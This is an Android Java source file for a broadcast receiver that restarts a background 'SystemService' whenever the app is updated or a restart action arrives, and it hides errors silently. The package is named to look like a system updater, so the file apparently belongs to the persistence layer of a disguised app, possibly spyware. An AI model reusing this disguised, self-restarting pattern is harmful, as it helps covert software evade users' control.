// RestartReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class RestartReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        // Restart service on any restart trigger
        if (action != null && (
            action.equals("com.system.service.update.RESTART_SERVICE") ||
            action.equals(Intent.ACTION_MY_PACKAGE_REPLACED) ||
            action.equals("RESTART_SERVICE"))) {
            
            startService(context);
        }
    }
    
    private void startService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
